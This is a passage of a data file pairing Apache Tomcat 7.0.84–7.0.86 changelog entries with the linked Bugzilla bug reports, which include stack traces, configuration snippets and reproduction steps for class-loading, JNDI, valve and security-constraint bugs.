        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:464)
        at org.apache.catalina.valves.rewrite.RewriteValve.invoke(RewriteValve.java:540)
        at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:651)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:137)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:92)
        at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:651)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
        at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:407)
        at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
        at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:754)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1376)
        at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
        - locked <0x00000000f898c128> (a org.apache.tomcat.util.net.NioEndpoint$NioSocketWrapper)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:748)

		






java.io.IOException: Unable to delete file [....ABCDE.session] which is no longer required
	at org.apache.catalina.session.FileStore.remove(FileStore.java:269)
	at org.apache.catalina.session.StoreBase.processExpires(StoreBase.java:189)
	at org.apache.catalina.session.PersistentManagerBase.processExpires(PersistentManagerBase.java:433)
	at org.apache.catalina.session.ManagerBase.backgroundProcess(ManagerBase.java:558)
	at org.apache.catalina.core.StandardContext.backgroundProcess(StandardContext.java:5406)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1396)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.processChildren(ContainerBase.java:1400)
	at org.apache.catalina.core.ContainerBase$ContainerBackgroundProcessor.run(ContainerBase.java:1368)
	at java.lang.Thread.run(Thread.java:748)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62175
Catalina|Tomcat 7.0.86 (violetagg)|fix||Ensure that NamingContextListener instances are only notified once of property changes on the associated naming resources. (markt)|||
Catalina|Tomcat 7.0.86 (violetagg)|add|62224|Disable the forkJoinCommonPoolProtection of the JreMemoryLeakPreventionListener when running on Java 9 and above since the underlying JRE bug has been fixed. (markt)|SafeForkJoinWorkerThreadFactory breaks class loading on org.apache.naming.java.javaURLContextFactory|"Tomcat 8.0.42 introduces a change to install a different ForkJoinWorkerThreadFactory into Java using a System property in an unconditional way.

Link to the change from 8.0.42: https://github.com/apache/tomcat80/compare/TOMCAT_8_0_41...TOMCAT_8_0_42#diff-738f0383c5c3a3e5bbd162aa59a114c6R470

We have tried to bisect Tomcat versions from 9.0.6 to 8.0.42 and all version upgrades have yielded to the following exception:

javax.naming.NoInitialContextException: Cannot instantiate class: org.apache.naming.java.javaURLContextFactory [Root exception is java.lang.ClassNotFoundException: org.apache.naming.java.javaURLContextFactory]
	at javax.naming.spi.NamingManager.getInitialContext(NamingManager.java:674)
	at javax.naming.InitialContext.getDefaultInitCtx(InitialContext.java:313)
	at javax.naming.InitialContext.init(InitialContext.java:244)
	at javax.naming.InitialContext.<init>(InitialContext.java:192)

When trying Tomcat 8.0.41, the exception does not appear anymore.

When trying Tomcat 8.0.42, when we remove the following Listener from server.xml, the exception does not occur any more:

<Listener className=""org.apache.catalina.core.JreMemoryLeakPreventionListener""/>"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62224
Catalina|Tomcat 7.0.86 (violetagg)|fix|62263|Avoid a NullPointerException when the RemoteIpValve processes a request for which no Context can be found. (markt)|java.lang.NullPointerException when using RemoteIpValve|"Created attachment 35844 [details]
server.xml with added RemoteIpValve

Steps to reproduce for a newly downloaded instance of Tomcat 9.0.6:

1. Add RemoteIpValve in server.xml

<Valve className=""org.apache.catalina.valves.RemoteIpValve""
     protocolHeader=""x-forwarded-proto"" />
               
See also attachment.

2. Delete webapps\ROOT

3. Startup

Request for Root-URL 

http://localhost:8080

or any other not present context

http://localhost:8080/foo

leads to

05-Apr-2018 17:52:05.780 SCHWERWIEGEND [http-nio-8080-exec-2] org.apache.coyote.http11.Http11Processor.service Error processing request
 java.lang.NullPointerException
	at org.apache.catalina.connector.Request.notifyAttributeAssigned(Request.java:1525)
	at org.apache.catalina.connector.Request.setAttribute(Request.java:1511)
	at org.apache.catalina.valves.RemoteIpValve.invoke(RemoteIpValve.java:665)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:651)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:87)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:343)
	at org.apache.coyote.http11.Http11Processor.service(Http11Processor.java:407)
	at org.apache.coyote.AbstractProcessorLight.process(AbstractProcessorLight.java:66)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:754)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1376)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
	
Reproducable for Windows 7 and CentOS 6.9.

In our production environment we also get this exception, although there is a ROOT-Context (alas a custom one) deployed. I will do some furher investigations tomorrow.

Thanks a lot in advance."|https://bz.apache.org/bugzilla/show_bug.cgi?id=62263
Coyote|Tomcat 7.0.86 (violetagg)|fix||Correct off-by-one error in thread pool that allowed thread pools to increase in size to one more than the configured limit. Patch provided by usc. (markt)|||
Web applications|Tomcat 7.0.86 (violetagg)|add||Work-around a known, non-specification compliant behaviour in some versions of IE that can allow XSS when the Manager application generates a plain text response. Based on a suggestion from Muthukumar Marikani. (markt)|||
Web applications|Tomcat 7.0.86 (violetagg)|add||Add document for FragmentationInterceptor. (kfujino)|||
Web applications|Tomcat 7.0.86 (violetagg)|add||Document how the roles for an authenticated user are determined when the CombinedRealm is used. (markt)|||
jdbc-pool|Tomcat 7.0.86 (violetagg)|fix||Ensure that SQLWarning has been cleared when connection returns to the pool. (kfujino)|||
jdbc-pool|Tomcat 7.0.86 (violetagg)|fix||Ensure that parameters have been cleared when PreparedStatement and/or CallableStatement are cached. (kfujino)|||
jdbc-pool|Tomcat 7.0.86 (violetagg)|fix||Enable PoolCleaner to be started even if validationQuery is not set. (kfujino)|||
Other|Tomcat 7.0.86 (violetagg)|update||Update the build script so MD5 hashes are no longer generated for releases as per the change in the ASF distribution policy. (markt)|||
Other|Tomcat 7.0.86 (violetagg)|fix|62164|Switch the build script to use TLS for downloads from SourceForge and Maven Central to avoid failures due to HTTP to HTTPS redirects. (markt)|Build for Eclipse IDE does not work|"Follow the instructions from

 https://tomcat.apache.org/tomcat-8.5-doc/building.html

When you execute

 ant ide-eclipse

the build fails with

BUILD FAILED
/path/tomcat-8.5/build.xml:2650: The following error occurred while executing this line:
/path/tomcat-8.5/build.xml:2780: Redirection detected from http to https. Protocol switch unsafe, not allowed.


ant -version
Apache Ant(TM) version 1.10.2 compiled on February 3 2018"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62164
Catalina|Tomcat 7.0.85 (violetagg)|fix||Prevent a stack trace being written to standard out when running on Java 10 due to changes in the LogManager implementation. (markt)|||
Catalina|Tomcat 7.0.85 (violetagg)|fix||Avoid duplicate load attempts if one has been made already. (remm)|||
Catalina|Tomcat 7.0.85 (violetagg)|fix||Avoid NPE in ThreadLocalLeakPreventionListener if there is no Engine. (remm)|||
Catalina|Tomcat 7.0.85 (violetagg)|fix|58143|Fix calling classloading transformers broken in 7.0.70 by the fix for 59619. This was observed when using Spring weaving. (rjung)|The WebppClassLoader doesn't call transformers on cached classes|"The Spring Framework load time weaving mechanism registers class file transformers when the web app is deployed:

WebappClassLoader(WebappClassLoaderBase).addTransformer(ClassFileTransformer) line: 666
	TomcatLoadTimeWeaver.addTransformer(ClassFileTransformer) line: 88	
	DefaultContextLoadTimeWeaver.addTransformer(ClassFileTransformer) line: 143	
	AspectJWeavingEnabler.enableAspectJWeaving(LoadTimeWeaver, ClassLoader) line: 83	
	AspectJWeavingEnabler.postProcessBeanFactory(ConfigurableListableBeanFactory) line: 71	
	PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(Collection<BeanFactoryPostProcessor>, ConfigurableListableBeanFactory) line: 284	
	PostProcessorRegistrationDelegate.invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory, List<BeanFactoryPostProcessor>) line: 174	
	XmlWebApplicationContext(AbstractApplicationContext).invokeBeanFactoryPostProcessors(ConfigurableListableBeanFactory) line: 658	
	XmlWebApplicationContext(AbstractApplicationContext).refresh() line: 504	
	ContextLoaderListener(ContextLoader).configureAndRefreshWebApplicationContext(ConfigurableWebApplicationContext, ServletContext) line: 446	
	ContextLoaderListener(ContextLoader).initWebApplicationContext(ServletContext) line: 328	
	ContextLoaderListener.contextInitialized(ServletContextEvent) line: 107	
	StandardContext.listenerStart() line: 4729	
	StandardContext.startInternal() line: 5167	
	StandardContext(LifecycleBase).start() line: 150	
	StandardHost(ContainerBase).addChildInternal(Container) line: 725	
	StandardHost(ContainerBase).addChild(Container) line: 701	
	StandardHost.addChild(Container) line: 717	
	HostConfig.deployWAR(ContextName, File) line: 945	
	HostConfig$DeployWar.run() line: 1768	
	Executors$RunnableAdapter<T>.call() line: 511	
	FutureTask<V>.run() line: 266	
	ThreadPoolExecutor.runWorker(ThreadPoolExecutor$Worker) line: 1142	
	ThreadPoolExecutor$Worker.run() line: 617	
	Thread.run() line: 745	

After this moment, any classes loaded will be transformed, if necessary.

My problem is that Tomcat loads some classes before these transformers are registered:
	WebappClassLoader(WebappClassLoaderBase).findResourceInternal(String, String, boolean) line: 2639	
	WebappClassLoader(WebappClassLoaderBase).findResource(String) line: 936	
	WebappClassLoader(WebappClassLoaderBase).getResourceAsStream(String) line: 1115	
	ContextConfig.populateJavaClassCache(String) line: 2165	
	ContextConfig.populateJavaClassCache(String, JavaClass) line: 2155	
	ContextConfig.checkHandlesTypes(JavaClass) line: 2060	
	ContextConfig.processAnnotationsStream(InputStream, WebXml, boolean) line: 2012	
	ContextConfig.processAnnotationsJar(URL, WebXml, boolean) line: 1961	
	ContextConfig.processAnnotationsUrl(URL, WebXml, boolean) line: 1936	
	ContextConfig.processAnnotations(Set<WebXml>, boolean) line: 1897	
	ContextConfig.webConfig() line: 1149	
	ContextConfig.configureStart() line: 771	
	ContextConfig.lifecycleEvent(LifecycleEvent) line: 305	
	LifecycleSupport.fireLifecycleEvent(String, Object) line: 117	
	StandardContext(LifecycleBase).fireLifecycleEvent(String, Object) line: 90	
	StandardContext.startInternal() line: 5066	
	StandardContext(LifecycleBase).start() line: 150	
	StandardHost(ContainerBase).addChildInternal(Container) line: 725	
	StandardHost(ContainerBase).addChild(Container) line: 701	
	StandardHost.addChild(Container) line: 717	
	HostConfig.deployWAR(ContextName, File) line: 945	
	HostConfig$DeployWar.run() line: 1768	
	Executors$RunnableAdapter<T>.call() line: 511	
	FutureTask<V>.run() line: 266	
	ThreadPoolExecutor.runWorker(ThreadPoolExecutor$Worker) line: 1142	
	ThreadPoolExecutor$Worker.run() line: 617	
	Thread.run() line: 745	

This makes subsequent calls to WebappClassLoaderBase.findResourceInternal to return cached resources:
ResourceEntry entry = resourceEntries.get(path);
if (entry != null) {
    return entry;
}

These cached resources will not go through the transformers, which are called bellow.

Maybe the resourceEntries cache could be flushed somehow?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=58143
Catalina|Tomcat 7.0.85 (violetagg)|fix|62000|When a JNDI reference cannot be resolved, ensure that the root cause exception is reported rather than swallowed. (markt)|Avoid swallowing exception inside NamingContext lookup|"Hi,

I wrote custom ObjectFactoryBuilder which throws my custom exception in case of invalid configuration. That exception is caught inside org.apache.naming.NamingContext lookup logged with WARNING msg and throws new NamingException without chaining the root exception. I see it is possible to set up the cause with calling the method initCause.

I would like ask you for advice if it is possible to chain the root cause exception, it will helps me log it on error and analysis it by AppDynamics.
If you think that it could be implemented to return the root cause exception I can contribute.

Jan 15, 2018 8:34:06 AM org.apache.naming.NamingContext lookup
WARNING: Unexpected exception resolving reference
core.dbcp.exception.EncryptionFailedException: Failed to decrypt string
        at core.dbcp.EncryptedUcpPoolDataSourceImpl.getObjectInstance(EncryptedUcpPoolDataSourceImpl.java:26)
        at org.apache.naming.factory.ResourceFactory.getObjectInstance(ResourceFactory.java:141)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:321)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:848)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
        at org.apache.naming.NamingContextBindingsEnumeration.nextElementInternal(NamingContextBindingsEnumeration.java:117)
        at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:71)
        at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:34)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:138)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:145)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:110)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.lifecycleEvent(GlobalResourcesLifecycleListener.java:82)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:388)
        at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:333)
        at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:751)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:694)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:294)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:428)
Caused by: org.jasypt.exceptions.EncryptionOperationNotPossibleException
        at org.jasypt.encryption.pbe.StandardPBEByteEncryptor.decrypt(StandardPBEByteEncryptor.java:801)
        at org.jasypt.encryption.pbe.StandardPBEStringEncryptor.decrypt(StandardPBEStringEncryptor.java:639)
        at core.dbcp.crypto.CipherEncrypter.decrypt(CipherEncrypter.java:35)
        ... 27 more

Jan 15, 2018 8:34:06 AM org.apache.catalina.mbeans.GlobalResourcesLifecycleListener createMBeans
SEVERE: Exception processing Global JNDI Resources
javax.naming.NamingException: Failed to decrypt string
        at org.apache.naming.NamingContext.lookup(NamingContext.java:865)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
        at org.apache.naming.NamingContextBindingsEnumeration.nextElementInternal(NamingContextBindingsEnumeration.java:117)
        at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:71)
        at org.apache.naming.NamingContextBindingsEnumeration.next(NamingContextBindingsEnumeration.java:34)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:138)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:145)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.createMBeans(GlobalResourcesLifecycleListener.java:110)
        at org.apache.catalina.mbeans.GlobalResourcesLifecycleListener.lifecycleEvent(GlobalResourcesLifecycleListener.java:82)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.util.LifecycleBase.setStateInternal(LifecycleBase.java:388)
        at org.apache.catalina.util.LifecycleBase.setState(LifecycleBase.java:333)
        at org.apache.catalina.core.StandardServer.startInternal(StandardServer.java:751)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:145)
        at org.apache.catalina.startup.Catalina.start(Catalina.java:694)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
        at java.lang.reflect.Method.invoke(Method.java:498)
        at org.apache.catalina.startup.Bootstrap.start(Bootstrap.java:294)
        at org.apache.catalina.startup.Bootstrap.main(Bootstrap.java:428)


Regards,
Damian"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62000
Catalina|Tomcat 7.0.85 (violetagg)|fix|62036|When caching an authenticated user Principal in the session when the web application is configured with the NonLoginAuthenticator, cache the internal Principal object rather than the user facing Principal object as Tomcat requires the internal object to correctly process later authorization checks. (markt)|Roles stripped when using programmatic login() in tomcat 8.5 but not 8.0|"Filing a Bugzilla entry for an issue reported by Robert J. Carr on the users@ list. See
http://markmail.org/message/rfm2qejzgcd2uwmh

I can confirm that the issue is reproducible in the current Tomcat 8.5 and 9.0.

Steps to reproduce:

[quote]
To reproduce the problem in tomcat 8.5.24 (for me):

 1)  make a user available with the role ""testrole"" (I just user
tomcat-users)

 2) startup tomcat, copy the war file into webapps

 3) go to the application homepage, index.jsp should auto load

 4) enter username and password and login; it should change to the username
you're authenticated with

 5) hit the auth test link and it should give you a success message

 6) hit the same link again and it should give you a 403

If you want to see how things are changing, I created an unprotected page
called /authinfo (no jsp) that shows the logged in user and role.  Here's
what it shows as you proceed through the test:

 * no user or role
 * user and role
 * user, but no role

If you do this same process in tomcat 8 (8.0.43, for me) it works fine,
particularly, the you can hit the link as many times as you want and the
roles never go away until you logout.  And generally, the login/test/logout
works perfectly, where in 8.5 even if you logout it doesn't always log you
back in the next time either.  Sometimes its takes several attempts.
[/quote]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62036
Catalina|Tomcat 7.0.85 (violetagg)|fix|62067|"Correctly apply security constraints mapped to the context root using a URL pattern of """". (markt)"|"HttpConstraint not applied when Servlet mapped """""|"Created attachment 35711 [details]
Source demonstrating the problem

Overview: 

    When mapping a servlet to the url pattern """", and specifying a security constraint like TransportGuarantee.CONFIDENTIAL, the constraint is not applied.

Steps to Reproduce: 

    1) Define a servlet and annotate with:
    @WebServlet (name = ""Root"", urlPatterns = { """" })
    @ServletSecurity(@HttpConstraint(transportGuarantee = ServletSecurity.TransportGuarantee.CONFIDENTIAL))

    2) Deploy as the ROOT web app on Tomcat configured with a HTTP and a HTTPS connector

    3) Access the server with, for example: wget http://localhost:8080/

Actual Results:

    The resource is retrieved over HTTP

Expected Results: 

    Tomcat initially responds with a redirect, and the resource is retrieved over HTTPS

Remarks:

    Access should be denied in case of a configuration error (such redirectPort=0 on the HTTP connector)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=62067
Catalina|Tomcat 7.0.85 (violetagg)|fix||When using Tomcat embedded, only perform Authenticator configuration once during web application start. (markt)|||
Catalina|Tomcat 7.0.85 (violetagg)|fix||Process all ServletSecurity annotations at web application start rather than at servlet load time to ensure constraints are applied consistently. (markt)|||
Catalina|Tomcat 7.0.85 (violetagg)|fix||Minor optimization when calling class transformers. (rjung)|||
Web applications|Tomcat 7.0.85 (violetagg)|add|48672|Add documentation for the Host Manager web application. Patch provided by Marek Czernek. (markt)|Tomcat Virtual Host Manager (/host-manager) needs documentation|"When in /host-manager application one wants to see ""Host Manager Help"", link leads to 404 page.
Maybe we should supply ""/host-manager/../docs/virtual-hosting-howto.html"" instead of non working ""/host-manager/../docs/host-manager-howto.html""."|https://bz.apache.org/bugzilla/show_bug.cgi?id=48672
Other|Tomcat 7.0.85 (violetagg)|update||Update the NSIS Installer used to build the Windows installer to version 3.03. (kkolinko)|||
Catalina|Tomcat 7.0.84 (violetagg)|fix|47214|Use a loop to preload anonymous inner classes when running under a SecurityManager, to be safe for future changes in the code or using a different compiler. (kkolinko)|Inner classes that are explicitly referenced - should not be anonymous|"Classes
 o.a.catalina.security.SecurityClassLoad
 o.a.catalina.jasper.SecurityClassLoad
perform preloading of certain classes of Tomcat.

My concern is that some of those preloaded classes are anonymous ones, e.g.

        loader.loadClass
            (basePackage + ""session.StandardSession"");
        loader.loadClass
            (basePackage + ""session.StandardSession$1"");

Referencing anonymous classes by their numbers is too fragile. It can be broken by any code modification that will cause their renumbering. Also, it is hard to review patches to SecurityClassLoad when they contain such references. See e.g. r721704

I suggest that all such classes were explicitly named. See classes referenced in o.a.catalina.security.SecurityClassLoad for an example (e.g.: o.a.c.core.ApplicationDispatcher with inner classes PrivilegedForward, PrivilegedInclude)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=47214
Catalina|Tomcat 7.0.84 (violetagg)|add|57619|Implement a small optimisation to how JAR URLs are processed to reduce the storage of duplicate String objects in memory. Patch provided by Dmitri Blinov. (markt)|Memory consumption|"I have inspected running tomcat containing two webapps with Eclipse Memory Analyser and have found lots of same instances of String. For example

14300x ""jar""
3100x ""/home/xxxx/workspace/.metadata/.plugins/org.eclipse.wst.server.core/tmp2/wtpwebapps/XXXXXXXX/WEB-INF/lib/AppXXXXXXX.jar""

lots of similar long paths to other jars.

It is just few MBs of memory, but it could help a little to merge them somehow."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57619
Catalina|Tomcat 7.0.84 (violetagg)|add|61810|Support configure the interval to keep all jars open if no jar is accessed, a non-positive interval indicates keeping jars always open. (huxing)|[Proposal] Support configure the interval to keep all jars open if no jar is accessed|"The Problem:

When the traffic spikes, the web application's business thread pool becomes full.

Jstack shows one of the thread is holding a lock that block most of other threads. The stack trace is as follows:

""HSFBizProcessor-DEFAULT-12-thread-332"" Id=10156 RUNNABLE
        at java.util.zip.ZipFile.open(Native Method)
        at java.util.zip.ZipFile.<init>(ZipFile.java:219)
        at java.util.zip.ZipFile.<init>(ZipFile.java:149)
        at java.util.jar.JarFile.<init>(JarFile.java:166)
        at java.util.jar.JarFile.<init>(JarFile.java:130)
        at org.apache.catalina.loader.WebappClassLoaderBase.openJARs(WebappClassLoaderBase.java:3120)
        at org.apache.catalina.loader.WebappClassLoaderBase.findResourceInternal(WebappClassLoaderBase.java:3409)
        -  locked [Ljava.util.jar.JarFile;@972f6eb
        at org.apache.catalina.loader.WebappClassLoaderBase.findClassInternal(WebappClassLoaderBase.java:3152)
        at org.apache.catalina.loader.WebappClassLoaderBase.findClass(WebappClassLoaderBase.java:1373)
        at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1861)
        -  locked org.apache.catalina.loader.WebappClassLoader@726ec590


We have a web application who has ~800 jar files under WEB-INF/lib. By default tomcat will close all the JarFile objects if there is no access to the jar file after 90s, which is hard-coded.

However, if at some point, we need to load a class that is not loaded before, tomcat will have to open all the jar files before trying to load the class. What makes matter worse is that, the disk is HDD, which makes Opening ~800 jar files quite time consuming, eventually cause this operation to block all other threads.


Lessons learned:

Enable parallel class loading, so that one thread trying to load a class don't block other threads. However, if multiple threads trying to load the same class, the issue might still happen.


New Proposal:

From my point of view, the reason why Tomcat close all the jars opened is to release the file descriptors to save resources. If resource is not a problem, we can keeps all the jar opened for a fairly long time, or even keeps them always opened. 

Therefore, we propose to introduce a new attribute, called 'jarOpenInterval', in WebappClassLoaderBase, to track the interval that can keep all the jars opened if they are not accessed. The default value is 90000 milliseconds, which is the same as the current implementation. The attribute can be configured in two ways:

1. static configuration in context.xml

<Loader jarOpenInterval=""90000"" />

2. dynamic configuration via JMX. This value should be changed during runtime.


Any thoughts?

p.s. About the default value for jarOpenInterval, I found that Tomcat 8+ has removed the implementation of the close jar operation, which indeed will hold all the file descriptors during start up. Does that mean that holding all the file descriptor is not a issue any more? Can we keep all jars open by default?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61810
Catalina|Tomcat 7.0.84 (violetagg)|fix|61886|Pre-load additional classes to prevent SecurityExceptions if the first request received when running under a SecurityManager is an asynchronous Servlet. (markt)|7.0.83 Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]|"Release candidate of 7.0.83
- Java 8u152
- NIO connector
- Compression enabled
- Running with Security Manager 
    <Connector port=""8080"" protocol=""org.apache.coyote.http11.Http11NioProtocol""
               connectionTimeout=""20000""
               redirectPort=""8443""
               useSendfile=""false"" compression=""force"" compressionMinSize=""1""
    />

I noted the following error in catalina.2017-12-11.log while running the async examples (for sake of smoke-testing):

There are two log messages.
The first INFO one is OK (though why we are logging it at all?), the second one is WARNING and is unexpected.

[[[
–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.coyote.AbstractProcessor setErrorState
INFO: An error occurred in processing while on a non-container thread. The connection will be closed immediately
java.io.IOException: –ü—Ä–æ–≥—Ä–∞–º–º–∞ –Ω–∞ –≤–∞—à–µ–º —Ö–æ—Å—Ç-–∫–æ–º–ø—å—é—Ç–µ—Ä–µ —Ä–∞–∑–æ—Ä–≤–∞–ª–∞ —É—Å—Ç–∞–Ω–æ–≤–ª–µ–Ω–Ω–æ–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–µ
(English Translation: ""The program on your host computer has broken the established connection"")

	at sun.nio.ch.SocketDispatcher.write0(Native Method)
	at sun.nio.ch.SocketDispatcher.write(SocketDispatcher.java:51)
	at sun.nio.ch.IOUtil.writeFromNativeBuffer(IOUtil.java:93)
	at sun.nio.ch.IOUtil.write(IOUtil.java:65)
	at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:471)
	at org.apache.tomcat.util.net.NioChannel.write(NioChannel.java:125)
	at org.apache.tomcat.util.net.NioBlockingSelector.write(NioBlockingSelector.java:101)
	at org.apache.tomcat.util.net.NioSelectorPool.write(NioSelectorPool.java:174)
	at org.apache.coyote.http11.InternalNioOutputBuffer.writeToSocket(InternalNioOutputBuffer.java:164)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flushBuffer(InternalNioOutputBuffer.java:243)
	at org.apache.coyote.http11.InternalNioOutputBuffer.flush(InternalNioOutputBuffer.java:95)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:828)
	at org.apache.coyote.Response.action(Response.java:171)
	at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:366)
	at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:334)
	at org.apache.catalina.connector.CoyoteWriter.flush(CoyoteWriter.java:98)
	at async.AsyncStockServlet.writeStock(AsyncStockServlet.java:102)
	at async.AsyncStockServlet.tick(AsyncStockServlet.java:82)
	at async.Stockticker.run(Stockticker.java:84)
	at java.lang.Thread.run(Thread.java:748)

–¥–µ–∫ 11, 2017 1:38:44 PM org.apache.catalina.core.AsyncContextImpl setErrorState
WARNING: onError() failed for listener of type [org.apache.catalina.core.AsyncListenerWrapper]
java.lang.IllegalStateException: Calling [asyncComplete()] is not valid for a request with Async state [MUST_COMPLETE]
	at org.apache.coyote.AsyncStateMachine.doComplete(AsyncStateMachine.java:291)
	at org.apache.coyote.AsyncStateMachine.asyncComplete(AsyncStateMachine.java:275)
	at org.apache.coyote.http11.Http11NioProcessor.actionInternal(Http11NioProcessor.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:946)
	at org.apache.coyote.Request.action(Request.java:345)
	at org.apache.catalina.core.AsyncContextImpl.complete(AsyncContextImpl.java:103)
	at async.AsyncStockServlet.onError(AsyncStockServlet.java:118)
	at org.apache.catalina.core.AsyncListenerWrapper.fireOnError(AsyncListenerWrapper.java:54)
	at org.apache.catalina.core.AsyncContextImpl.setErrorState(AsyncContextImpl.java:455)
	at org.apache.catalina.connector.CoyoteAdapter.asyncDispatch(CoyoteAdapter.java:298)
	at org.apache.coyote.http11.AbstractHttp11Processor.asyncDispatch(AbstractHttp11Processor.java:1713)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:616)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1775)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1734)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:748)
]]]"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61886
